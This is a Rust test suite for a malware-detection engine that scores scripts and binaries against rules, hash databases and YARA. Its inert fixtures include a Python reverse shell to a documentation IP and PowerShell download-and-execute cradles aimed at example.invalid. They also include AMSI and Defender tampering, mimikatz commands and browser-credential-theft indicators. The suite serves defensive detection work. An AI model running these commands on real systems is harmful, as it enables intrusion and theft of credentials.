//! Inert synthetic fixtures: never execute these strings or fetch payloads.
use super::*;
use base64::{Engine as _, engine::general_purpose::STANDARD};

fn engine() -> Engine {
    let (rules, rule_errors) = RuleSet::load(None);
    assert!(rule_errors.is_empty());
    Engine {
        rules,
        rule_errors,
        blocklist: HashSet::new(),
        allowlist: HashSet::new(),
        hashdb: None,
        yara: yara::Yara::default(),
        mb_key: String::new(),
        mb_cache: Mutex::new(HashMap::new()),
        agent: ureq::Agent::new_with_defaults(),
    }
}

fn score(engine: &Engine, name: &str, text: &str, kind: Kind) -> (i32, Vec<Finding>) {
    let (_, mut findings) = engine.analyze_buffer(name, text.as_bytes(), kind, 0);
    findings.extend(filetype::name_findings(name, kind));
    (findings.iter().map(|f| f.weight).sum(), findings)
}

#[test]
fn benign_programs_and_admin_scripts_stay_below_alert_threshold() {
    let engine = engine();
    let cases = [
        ("backup.ps1", "vssadmin delete shadows /oldest", Kind::Script),
        ("enable.ps1", "Set-MpPreference -DisableRealtimeMonitoring $false", Kind::Script),
        ("admin.ps1", "Add-MpPreference -ExclusionPath C:\\build", Kind::Script),
        (
            "download.ps1",
            "New-Object Net.WebClient; DownloadFile('https://example.invalid/file'); [Convert]::FromBase64String('YWJj')",
            Kind::Script,
        ),
        ("helper.js", "WScript.Shell ActiveXObject Scripting.FileSystemObject WScript.CreateObject", Kind::Script),
        ("health.ps1", "MsMpEng.exe avp.exe MBAMService bdagent.exe ekrn.exe", Kind::Script),
        ("client.exe", "discordcanary discordptb \\discord\\Local Storage\\leveldb", Kind::Pe),
        ("steam.exe", "loginusers.vdf \\Steam\\config\\ config\\config.vdf", Kind::Pe),
        (
            "browser.exe",
            "\\Login Data \\Local State encrypted_key CryptUnprotectData \\Google\\Chrome\\User Data \\Microsoft\\Edge\\User Data \\BraveSoftware\\Brave-Browser",
            Kind::Pe,
        ),
        ("mining.exe", "xmrig cryptonight stratum+tcp://example.invalid --donate-level", Kind::Pe),
        ("reference.py", "AsyncRAT RedLine Stealer XWorm xmrig -ExclusionPath DisableAntiSpyware", Kind::Script),
        ("terminal.lnk", "powershell.exe", Kind::Shortcut),
        ("notifier.py", "api.telegram.org/bot api.ipify.org", Kind::Script),
        ("desktop.exe", "GetAsyncKeyState GetForegroundWindow GetWindowText WriteFile \\CurrentVersion\\Run", Kind::Pe),
    ];
    for (name, text, kind) in cases {
        let (score, findings) = score(&engine, name, text, kind);
        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
    }
}

#[test]
fn common_malware_capability_combinations_are_detected() {
    let engine = engine();
    let cases = [
        ("steal.py", "\\Login Data encrypted_key CryptUnprotectData api.telegram.org/bot", MALICIOUS),
        ("tokens.js", "dQw4w9WgXcQ: \\discord\\Local Storage\\leveldb discord.com/api/webhooks/", MALICIOUS),
        ("wallet.py", "wallet.dat \\Electrum\\wallets discord.com/api/webhooks/", MALICIOUS),
        ("loader.ps1", "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath", MALICIOUS),
        ("ransom.cmd", "vssadmin delete shadows your files have been encrypted bitcoin", MALICIOUS),
        ("shell.ps1", "Net.Sockets.TCPClient GetStream( Invoke-Expression .Write(", SUSPICIOUS),
        ("keys.py", "GetAsyncKeyState GetForegroundWindow WriteFile api.telegram.org/bot", MALICIOUS),
        ("dump.ps1", "privilege::debug sekurlsa::logonpasswords", SUSPICIOUS),
        ("drop.js", "MSXML2.XMLHTTP ADODB.Stream WScript.Shell .Run(", SUSPICIOUS),
        ("memory.ps1", "FromBase64String [Reflection.Assembly]::Load( .EntryPoint.Invoke( AmsiUtils amsiInitFailed SetValue(", MALICIOUS),
    ];
    for (name, text, threshold) in cases {
        let (score, findings) = score(&engine, name, text, Kind::Script);
        assert!(score >= threshold, "{name}: {score} {findings:?}");
    }
}

#[test]
fn remote_access_trojan_capabilities_in_programs() {
    let engine = engine();
    let creds = "\\Login Data \\Local State encrypted_key CryptUnprotectData \\Google\\Chrome\\User Data \\Microsoft\\Edge\\User Data \\BraveSoftware\\Brave-Browser";
    let benign = [
        ("procexp.exe", "Image File Execution Options Debugger taskmgr.exe".to_string()),
        ("desktops.exe", "CreateDesktop SetThreadDesktop lpDesktop SwitchDesktop".to_string()),
        ("macros.exe", "SetWindowsHookEx CallNextHookEx GetForegroundWindow GetWindowText \\CurrentVersion\\Run".to_string()),
        ("avstatus.exe", "GetProcessesByName MsMpEng MsSense SentinelAgent".to_string()),
        ("browser.exe", format!("{creds} SetWindowsHookEx CallNextHookEx GetForegroundWindow GetWindowText")),
    ];
    for (name, text) in benign {
        let (score, findings) = score(&engine, name, &text, Kind::Pe);
        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
    }
    let malicious = [
        ("killer.exe", format!("{creds} GetProcessesByName MsMpEng MsSense \\CurrentVersion\\Run"), MALICIOUS),
        ("ifeo.exe", format!("{creds} SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options Debugger MsMpEng.exe"), MALICIOUS),
        ("hvnc.exe", format!("{creds} CreateDesktop lpDesktop PrintWindow SetWindowsHookEx CallNextHookEx GetForegroundWindow GetWindowText"), MALICIOUS),
        ("ifeo_only.exe", "Image File Execution Options Debugger MsMpEng.exe".to_string(), SUSPICIOUS),
        ("reset.exe", "C:\\Recovery\\OEM\\ResetConfig.xml BasicReset_AfterImageApply \\CurrentVersion\\Run".to_string(), SUSPICIOUS),
    ];
    for (name, text, threshold) in malicious {
        let (score, findings) = score(&engine, name, &text, Kind::Pe);
        assert!(score >= threshold, "{name}: {score} {findings:?}");
    }
}

/// Filler that is neither text nor a single repeated byte (which would look like
/// anti-AV padding).
fn noise(len: usize) -> Vec<u8> {
    let mut x = 0x9E37_79B9_7F4A_7C15u64;
    (0..len)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            (x >> 56) as u8
        })
        .collect()
}

const CHROMIUM_MARKERS: &str = "Chrome_WidgetWin_1 v8_context_snapshot.bin chrome-extension:// chrome://gpu";
/// What Chromium's sandbox, screen capture, input handling and password manager look like to the rules.
const CHROMIUM_APIS: &str = "CreateDesktopW SetThreadDesktop PrintWindow BitBlt SetWindowsHookExW CallNextHookEx GetForegroundWindow \
     GetWindowTextW content.proto.EmbedderDownloadData /.exec(ipchars) b.eval(s.eval(xy)) logins.json encrypted_key CryptUnprotectData \
     \\Login Data \\Google\\Chrome\\User Data \\Microsoft\\Edge\\User Data \\Mozilla\\Firefox\\Profiles \\CurrentVersion\\Run";

#[test]
fn chromium_based_programs_stay_below_alert_threshold() {
    let engine = engine();
    // An unsigned Electron app or libcef.dll: the engine's own capabilities, spread through a huge binary.
    let mut data = noise(BROWSER_ENGINE_SIZE);
    for (i, s) in [CHROMIUM_MARKERS, CHROMIUM_APIS].iter().enumerate() {
        let at = (i + 1) * BROWSER_ENGINE_SIZE / 3;
        data[at..at + s.len()].copy_from_slice(s.as_bytes());
    }
    let (_, findings) = engine.analyze_buffer("ExifCleaner.exe", &data, Kind::Pe, 0);
    let total = findings.iter().map(|f| f.weight).sum::<i32>() + 5; // + sig.unsigned
    assert!(total < SUSPICIOUS, "{total} {findings:?}");
    assert!(findings.iter().any(|f| f.id == "rule.info.chromium_engine"), "{findings:?}");

    // The same strings in a small program are not a browser engine.
    let small = format!("{CHROMIUM_MARKERS} {CHROMIUM_APIS} lpDesktop");
    let (score, findings) = score(&engine, "hvnc.exe", &small, Kind::Pe);
    assert!(score >= MALICIOUS, "{score} {findings:?}");
    assert!(!findings.iter().any(|f| f.id == "rule.info.chromium_engine"));
}

#[test]
fn bundled_javascript_and_python_test_suites_stay_below_alert_threshold() {
    let engine = engine();
    let gap = " ".repeat(600);
    let cases = [
        // VS Code's terminal auto-approve rules and PowerShell command tables.
        (
            "workbench.desktop.main.js",
            format!(
                r#"{{"Invoke-RestMethod":!1,"Invoke-WebRequest":!1,irm:!1,iwr:!1,eval:!1,"Invoke-Expression":!1,iex:!1}}
                c=new Set(["get-service","invoke-expression","invoke-restmethod","invoke-webrequest","irm","iwr"]),
                l=["write-output","iex","irm","iwr"];{gap}o.push(`Invoke-Expression (${{s}})`);
                {gap}let n=this.permissionRequests.get(e);{gap}/^\$(?<plain>[A-Za-z_]*)$/.exec(t)"#
            ),
        ),
        // LM Studio: local API docs, and its own install instruction far away.
        (
            "main_window.js",
            format!("{{children:\"curl http://127.0.0.1:1234/api/v1/chat\"}}{gap}{gap}{{text:\"irm https://lmstudio.ai/install.ps1 | iex\"}}"),
        ),
        // Chrome's lists of commands seen in paste-and-run attacks.
        ("clickfix.js", "Loaders curl,wget,invoke-webrequest,iwr,invoke-restmethod,irm Runners powershell,cmd,invoke-expression,iex,bash".to_string()),
        (
            "test_urllib2.py",
            format!(
                "def test_basic(self):\n    r = urllib.request.urlopen(self.url){gap}\n    exec(compile(src, 'x', 'exec'))\n\
                 s = socket.socket(socket.AF_INET){gap}\n    data = s.recv(1024){gap}\n    p = subprocess.Popen(cmd){gap}\n    s.sendall(b'ok')"
            ),
        ),
    ];
    for (name, text) in cases {
        // Even with .js counted as risky (as for a download), the content itself is clean.
        let (score, findings) = score(&engine, name, &text, Kind::Script);
        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
        assert!(!findings.iter().any(|f| f.id.starts_with("rule.")), "{name}: {findings:?}");
    }
}

#[test]
fn compact_script_cradles_and_shells_are_still_detected() {
    let engine = engine();
    let cases = [
        ("run.py", "exec(requests.get('https://example.invalid/p').text)", Kind::Script),
        ("stage.py", "r = urllib.request.urlopen(u)\ncode = r.read().decode()\nexec(code)", Kind::Script),
        (
            "shell.py",
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.0.2.1',4444))\n\
             p=subprocess.Popen(['cmd.exe'],stdin=PIPE,stdout=PIPE)\nwhile True:\n d=s.recv(1024);p.stdin.write(d);s.send(p.stdout.read(1))",
            Kind::Script,
        ),
        (
            "invoice.js",
            "new ActiveXObject('WScript.Shell').Run(\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/a')\")",
            Kind::Script,
        ),
        // A command list doesn't hide a real cradle elsewhere in the file.
        ("tool.ps1", "$deny = @('Invoke-WebRequest', 'iex'); Invoke-WebRequest -Uri $u -OutFile $f; IEX (Get-Content $f -Raw)", Kind::Script),
        ("update.cmd", "powershell -nop -c \"curl.exe http://example.invalid/a.ps1 | iex\"", Kind::Script),
        ("dropper.exe","powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"", Kind::Pe),
    ];
    for (name, text, kind) in cases {
        let (score, findings) = score(&engine, name, text, kind);
        assert!(score >= SUSPICIOUS, "{name}: {score} {findings:?}");
    }
}

#[test]
fn javascript_is_risky_only_when_it_came_from_the_internet() {
    let risky = |name, source, downloaded| name_findings(name, Kind::Script, source, downloaded).iter().any(|f| f.id == "name.risky_ext");
    assert!(!risky("main.js", Source::Manual, false));
    assert!(!risky("main.js", Source::Folder, false));
    assert!(risky("invoice.js", Source::Manual, true));
    assert!(risky("invoice.js", Source::Downloads, true));
    assert!(!risky("ui.js", Source::Steam, true));
    assert!(risky("setup.vbs", Source::Manual, false));
}

#[test]
fn encoded_and_split_payloads_retain_verdict_without_duplicate_points() {
    let engine = engine();
    let payload = "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
    let plain = score(&engine, "payload.ps1", payload, Kind::Script).0;
    let wide: Vec<u8> = payload.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let encoded = format!("powershell -EncodedCommand {}", STANDARD.encode(wide));
    let (encoded_score, findings) = score(&engine, "payload.ps1", &encoded, Kind::Script);
    assert_eq!(plain, encoded_score);
    assert!(findings.iter().any(|f| f.title.contains("recovered from")));
    let repeated = format!("{payload}; {encoded}; {encoded}");
    assert_eq!(plain, score(&engine, "payload.ps1", &repeated, Kind::Script).0);
    let split = "'Inv' + 'oke-Expression' ('Down' + 'loadString('); Add-MpPreference -ExclusionPath";
    assert_eq!(plain, score(&engine, "payload.ps1", split, Kind::Script).0);
    let caret = "Inv^oke-Expression Down^loadString( Add-MpPreference -ExclusionPath";
    assert_eq!(plain, score(&engine, "payload.cmd", caret, Kind::Script).0);
    let dynamic =
        "$p = $client.('Down' + 'loadString')('https://example.invalid'); & ('I' + 'EX') $p; Add-MpPreference -ExclusionPath C:\\build";
    assert_eq!(plain, score(&engine, "payload.ps1", dynamic, Kind::Script).0);
}

#[test]
fn benign_obfuscation_is_not_evidence_of_malware() {
    let engine = engine();
    let payload = "Write-Output 'Hello from an encoded deployment script'";
    let encoded = format!("powershell -enc {}", STANDARD.encode(payload));
    assert!(score(&engine, "deploy.ps1", &encoded, Kind::Script).0 < SUSPICIOUS);
    let bundle = format!("const image='data:image/png;base64,{}'; {}", "A".repeat(8000), "String.fromCharCode(65);".repeat(50));
    assert!(score(&engine, "bundle.js", &bundle, Kind::Script).0 < SUSPICIOUS);
    assert!(score(&engine, "chars.cmd", &"echo ^a ".repeat(100), Kind::Script).0 < SUSPICIOUS);
}

#[test]
fn python_extensions_are_scanned() {
    for ext in ["py", "pyw"] {
        assert!(filetype::is_code_ext(ext));
        assert_eq!(filetype::classify(&format!("script.{ext}"), b"import os"), Kind::Script);
    }
}

#[test]
fn zip_members_use_the_same_decoding_and_scoring() {
    use std::io::{Cursor, Write};
    let payload = "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
    let encoded = format!("powershell -enc {}", STANDARD.encode(payload));
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    zip.start_file("payload.ps1", zip::write::SimpleFileOptions::default()).unwrap();
    zip.write_all(encoded.as_bytes()).unwrap();
    let data = zip.finish().unwrap().into_inner();
    let (score, findings) = engine().analyze_buffer("delivery.zip", &data, Kind::Zip, 0);
    assert!(score >= MALICIOUS, "{findings:?}");
    assert!(findings.iter().any(|f| f.title.contains("payload.ps1") && f.title.contains("recovered from")));
}

/// Unique scratch path for a database file built by a test.
fn temp_db(name: &str) -> PathBuf {
    std::env::temp_dir().join(format!("vigil-test-{}-{name}.bin", std::process::id()))
}

#[test]
fn malwarebazaar_csv_imports_into_a_searchable_database() {
    let named = "a".repeat(64);
    let unnamed = "B".repeat(64);
    let csv = format!(
        "################################\n\
         # MalwareBazaar recent additions\n\
         # \"first_seen_utc\",\"sha256_hash\",\"md5_hash\",\"sha1_hash\",\"reporter\",\"file_name\",\"file_type_guess\",\"mime_type\",\"signature\",\"clamav\"\n\
         \"2026-10-30 10:00:00\", \"{named}\", \"{md5}\", \"{sha1}\", \"r\", \"a, \"\"quoted\"\" name.exe\", \"exe\", \"application/x-dosexec\", \"RedLineStealer\", \"n/a\"\n\
         \"2026-10-30 10:01:00\", \"{unnamed}\", \"{md5}\", \"{sha1}\", \"r\", \"b.exe\", \"exe\", \"application/x-dosexec\", \"n/a\", \"n/a\"\n\
         \"2026-10-30 10:02:00\", \"{unnamed}\", \"{md5}\", \"{sha1}\", \"r\", \"b.exe\", \"exe\", \"application/x-dosexec\", \"AgentTesla\", \"n/a\"\n\
         \"2026-10-30 10:03:00\", \"not-a-hash\", \"{md5}\"\n",
        md5 = "c".repeat(32),
        sha1 = "d".repeat(40),
    );
    let mut b = hashdb::Builder::new();
    assert_eq!(hashdb::import_csv(csv.as_bytes(), &mut b).unwrap(), 3);
    let path = temp_db("csv");
    assert_eq!(b.write(&path).unwrap(), 2);
    let db = hashdb::HashDb::open(&path).unwrap();
    assert_eq!(db.len(), 2);
    assert_eq!(db.lookup(&hashdb::parse_sha256(&named).unwrap()), Some("RedLineStealer"));
    // A named duplicate fills in the family of an earlier unnamed row.
    assert_eq!(db.lookup(&hashdb::parse_sha256(&unnamed).unwrap()), Some("AgentTesla"));
    assert_eq!(db.lookup(&[0x11; 32]), None);
    drop(db);
    let _ = std::fs::remove_file(path);
}

#[test]
fn headerless_csv_falls_back_to_the_first_sha256_field() {
    let hash = "0123456789abcdef".repeat(4);
    let mut b = hashdb::Builder::new();
    let csv = format!("{},{},{hash},x\n", "e".repeat(32), "f".repeat(40));
    assert_eq!(hashdb::import_csv(csv.as_bytes(), &mut b).unwrap(), 1);
    let path = temp_db("headerless");
    b.write(&path).unwrap();
    let db = hashdb::HashDb::open(&path).unwrap();
    assert_eq!(db.lookup(&hashdb::parse_sha256(&hash).unwrap()), Some(""));
    drop(db);
    let _ = std::fs::remove_file(path);
}

#[test]
fn known_hashes_are_found_in_files_and_inside_zips() {
    use std::io::{Cursor, Write};
    let member = b"MZ inert fixture bytes";
    let mut b = hashdb::Builder::new();
    b.add(Sha256::digest(member).into(), "TestFamily");
    let path = temp_db("engine");
    b.write(&path).unwrap();
    let mut engine = engine();
    engine.hashdb = Some(hashdb::HashDb::open(&path).unwrap());

    let hit = engine.known_hash(&hex(&Sha256::digest(member))).unwrap();
    assert_eq!(hit.id, "hash.malwarebazaar");
    assert!(hit.title.contains("TestFamily"));

    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    zip.start_file("tool.exe", zip::write::SimpleFileOptions::default()).unwrap();
    zip.write_all(member).unwrap();
    let data = zip.finish().unwrap().into_inner();
    let (score, findings) = engine.analyze_buffer("delivery.zip", &data, Kind::Zip, 0);
    assert!(score >= MALICIOUS, "{findings:?}");
    assert!(findings.iter().any(|f| f.id == "hash.malwarebazaar" && f.title.contains("tool.exe")));
    drop(engine);
    let _ = std::fs::remove_file(path);
}

#[test]
fn known_hashes_flag_files_that_are_not_windows_code() {
    let sample = b"\x7fELF\x02\x01\x01 inert fixture bytes";
    let mut b = hashdb::Builder::new();
    b.add(Sha256::digest(sample).into(), "Mirai");
    let path = temp_db("other");
    b.write(&path).unwrap();
    let mut engine = engine();
    engine.hashdb = Some(hashdb::HashDb::open(&path).unwrap());
    let file = std::env::temp_dir().join(format!("vigil-test-{}-sample.elf", std::process::id()));
    std::fs::write(&file, sample).unwrap();

    let r = engine.scan_file(&file, ScanOptions { source: Source::Downloads, sniff_all: true }).unwrap();
    assert!(r.analyzed);
    assert_eq!(r.verdict, Verdict::Malicious, "{:?}", r.findings);
    assert!(r.findings.iter().any(|f| f.id == "hash.malwarebazaar" && f.title.contains("Mirai")));
    // The Steam fast path still never opens non-code files.
    let r = engine.scan_file(&file, ScanOptions { source: Source::Steam, sniff_all: false }).unwrap();
    assert!(!r.analyzed);

    let _ = std::fs::remove_file(&file);
    drop(engine);
    let _ = std::fs::remove_file(path);
}

#[test]
fn yara_rules_flag_programs_and_foreign_executables() {
    let zip = yara::tests::package(&[("rules.yar", yara::tests::RULES)]);
    let (rules, _, _) = yara::compile_package(&zip).unwrap();
    let mut engine = engine();
    engine.yara = yara::Yara::from_package(rules);

    let (score, findings) = engine.analyze_buffer("tool.exe", b"MZ inert VIGIL-YARA-FAMILY-MARKER", Kind::Pe, 0);
    assert!(score >= MALICIOUS, "{findings:?}");

    let file = std::env::temp_dir().join(format!("vigil-test-{}-yara.elf", std::process::id()));
    std::fs::write(&file, b"\x7fELF inert VIGIL-YARA-ELF-MARKER").unwrap();
    let r = engine.scan_file(&file, ScanOptions { source: Source::Downloads, sniff_all: true }).unwrap();
    assert!(r.analyzed);
    assert_eq!(r.verdict, Verdict::Malicious, "{:?}", r.findings);
    assert!(r.findings.iter().any(|f| f.id == "yara.TEST_Elf_Marker"));
    // Other non-program files are only hash-checked.
    std::fs::write(&file, b"plain text VIGIL-YARA-ELF-MARKER").unwrap();
    let r = engine.scan_file(&file, ScanOptions { source: Source::Downloads, sniff_all: true }).unwrap();
    assert!(!r.analyzed);
    let _ = std::fs::remove_file(&file);
}

#[test]
fn corrupt_database_files_are_rejected() {
    let path = temp_db("corrupt");
    std::fs::write(&path, b"VIGILHD1\xff\xff\xff\xff\xff\xff\xff\xff\0\0\0\0\0\0\0\0").unwrap();
    assert!(hashdb::HashDb::open(&path).is_err());
    let _ = std::fs::remove_file(path);
}

#[test]
fn broken_signatures_only_ignored_while_steam_is_still_downloading() {
    let ids = |sig: Signature, source| signature_finding(&sig, Kind::Pe, source).map(|f| f.id);
    let tampered = || Signature::Invalid(InvalidReason::Tampered);
    for source in [Source::Manual, Source::Steam, Source::Workshop, Source::Downloads, Source::Launch] {
        assert_eq!(ids(tampered(), source).as_deref(), Some("sig.tampered"), "{source:?}");
    }
    assert_eq!(ids(tampered(), Source::SteamDownload), None);
    assert_eq!(ids(Signature::Invalid(InvalidReason::Other(1)), Source::SteamDownload), None);
    // Certificate trust doesn't depend on the file being complete.
    let untrusted = Signature::Invalid(InvalidReason::Untrusted);
    assert_eq!(ids(untrusted, Source::SteamDownload).as_deref(), Some("sig.untrusted"));
}

#[test]
fn defense_evasion_techniques_are_detected() {
    let engine = engine();
    let scripts = [
        ("defender.ps1", "Set-MpPreference -DisableRealtimeMonitoring:$true; IEX (New-Object Net.WebClient).DownloadString('https://example.invalid')", MALICIOUS),
        ("logging.ps1", "[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')", SUSPICIOUS),
        (
            "etw.ps1",
            "$a = GetProcAddress ntdll EtwEventWrite; VirtualProtect($a, 1, 0x40, [ref]0); [Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 1)",
            SUSPICIOUS,
        ),
        ("wipe.cmd", "wevtutil cl Security & powershell -c \"IEX (iwr https://example.invalid).Content; Invoke-WebRequest\"", MALICIOUS),
    ];
    for (name, text, threshold) in scripts {
        let (score, findings) = score(&engine, name, text, Kind::Script);
        assert!(score >= threshold, "{name}: {score} {findings:?}");
    }
    let programs = [
        ("policy.exe", "SOFTWARE\\Policies\\Microsoft\\Windows Defender DisableAntiSpyware wevtutil cl System", SUSPICIOUS),
        ("excl.exe", "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths sc stop WinDefend", SUSPICIOUS),
        ("killer.exe", "sc create rt type= kernel binPath= C:\\ProgramData\\RTCore64.sys \\CurrentVersion\\Run", SUSPICIOUS),
        ("unhook.exe", "\\KnownDlls\\ntdll.dll .text VirtualProtect NtMapViewOfSection advfirewall set allprofiles state off", SUSPICIOUS),
    ];
    for (name, text, threshold) in programs {
        let (score, findings) = score(&engine, name, text, Kind::Pe);
        assert!(score >= threshold, "{name}: {score} {findings:?}");
    }
}

#[test]
fn ordinary_security_administration_stays_clean() {
    let engine = engine();
    let cases = [
        ("fw.ps1", "netsh advfirewall firewall add rule name=Game dir=in action=allow; Set-NetFirewallProfile -All -Enabled True", Kind::Script),
        ("logs.cmd", "wevtutil qe System /c:10 /f:text & sc query WinDefend", Kind::Script),
        ("gpo.ps1", "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender -Name DisableAntiSpyware -Value 0", Kind::Script),
        ("agent.ps1", "New-Service -Name MyAgent -BinaryPathName C:\\Tools\\agent.exe", Kind::Script),
        ("defs.cmd", "MpCmdRun.exe -RemoveDefinitions -DynamicSignatures", Kind::Script),
        ("tuner.exe", "CreateService RTCore64.sys", Kind::Pe),
    ];
    for (name, text, kind) in cases {
        let (score, findings) = score(&engine, name, text, kind);
        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
    }
}

#[test]
fn system_program_names_outside_windows_are_impostors() {
    let root = r"C:\Windows";
    let impostor = |p: &str| filetype::impostor_finding(Path::new(p), root).is_some();
    assert!(impostor(r"C:\Users\me\AppData\Roaming\svchost.exe"));
    assert!(impostor(r"C:\Windows\Temp\lsass.exe"));
    assert!(impostor(r"C:\Windows\System32\Tasks\csrss.exe"));
    assert!(!impostor(r"C:\Windows\System32\svchost.exe"));
    assert!(!impostor(r"C:\Windows\explorer.exe"));
    assert!(!impostor(r"C:\Users\me\Downloads\setup.exe"));
}

fn yara_engine() -> Engine {
    let zip = yara::tests::package(&[("rules.yar", yara::tests::RULES)]);
    let (rules, _, _) = yara::compile_package(&zip).unwrap();
    let mut engine = engine();
    engine.yara = yara::Yara::from_package(rules);
    engine
}

fn block(kind: memory::BlockKind, data: &[u8]) -> memory::Block {
    memory::Block { kind, data: data.to_vec() }
}

#[test]
fn memory_shows_what_packing_hid() {
    let engine = yara_engine();
    // On disk the program only looked packed and named a webhook.
    let file = [
        Finding::new("pe.packer", "Packed", 10),
        Finding::new("sig.unsigned", "Not signed", 5),
        Finding::new("rule.stealer.exfil_channel", "Webhook", 20),
    ];
    let unpacked = br"MZ dQw4w9WgXcQ: \discord\Local Storage\leveldb discord.com/api/webhooks/ VIGIL-YARA-GENERIC-MARKER";
    let found = engine.scan_memory(&file, &[block(memory::BlockKind::Image, unpacked)]);
    let ids: Vec<&str> = found.iter().map(|f| f.id.as_str()).collect();
    assert!(ids.contains(&"rule.stealer.discord_tokens"), "{found:?}");
    assert!(ids.contains(&"yara.TEST_SUSP_Marker_Generic"), "{found:?}");
    // Tokens from memory plus the webhook from the file complete the combination.
    assert!(ids.contains(&"behavior.theft_exfil"), "{found:?}");
    // What the file scan already counted doesn't count twice.
    assert!(!ids.contains(&"rule.stealer.exfil_channel"), "{found:?}");
    assert!(found.iter().filter(|f| !f.id.starts_with("behavior.")).all(|f| f.title.starts_with("In memory: ")));
    let score: i32 = file.iter().chain(&found).map(|f| f.weight).sum();
    assert!(score >= MALICIOUS, "{score} {found:?}");

    // An image with nothing new in it adds nothing.
    assert!(engine.scan_memory(&file, &[block(memory::BlockKind::Image, b"MZ discord.com/api/webhooks/")]).is_empty());
}

#[test]
fn memory_flags_code_without_a_file() {
    let engine = yara_engine();
    let mut native = pe::tests::headers(false);
    native.extend_from_slice(b"VIGIL-YARA-FAMILY-MARKER");
    let blocks = [
        block(memory::BlockKind::Private, &native),
        block(memory::BlockKind::Private, &native),
        // The .NET runtime loads some assemblies into private memory itself.
        block(memory::BlockKind::Private, &pe::tests::headers(true)),
        block(memory::BlockKind::Replaced, b"MZ"),
        // JIT code and shellcode without headers.
        block(memory::BlockKind::Private, &[0xCC; 64]),
    ];
    let found = engine.scan_memory(&[], &blocks);
    let weight = |id: &str| found.iter().filter(|f| f.id == id).map(|f| f.weight).collect::<Vec<_>>();
    assert_eq!(weight("memory.unbacked_program"), [25]);
    assert_eq!(weight("memory.hollowed"), [60]);
    assert_eq!(weight("yara.TEST_Win_Marker_Family"), [80]);
    assert!(engine.scan_memory(&[], &[block(memory::BlockKind::Private, &pe::tests::headers(true))]).is_empty());

    // After a YARA match in the file, more matches only add a little.
    let file = [Finding::new("yara.TEST_SUSP_Marker_Generic", "Generic", 35)];
    let found = engine.scan_memory(&file, &blocks[..1]);
    assert_eq!(found.iter().find(|f| f.id == "yara.TEST_Win_Marker_Family").map(|f| f.weight), Some(5));
}

#[test]
fn memory_of_browser_engines_keeps_their_allowances() {
    let engine = engine();
    let chromium = r"\Login Data \Local State encrypted_key CryptUnprotectData \Google\Chrome\User Data \Microsoft\Edge\User Data \BraveSoftware\Brave-Browser";
    let blocks = [block(memory::BlockKind::Private, chromium.as_bytes())];
    let plain = engine.scan_memory(&[], &blocks);
    assert!(plain.iter().any(|f| BROWSER_ENGINE_EXPECTED.contains(&f.id.as_str())), "{plain:?}");
    let electron = engine.scan_memory(&[Finding::new("rule.info.chromium_engine", "Chromium", 0)], &blocks);
    assert!(!electron.iter().any(|f| BROWSER_ENGINE_EXPECTED.contains(&f.id.as_str())), "{electron:?}");
}
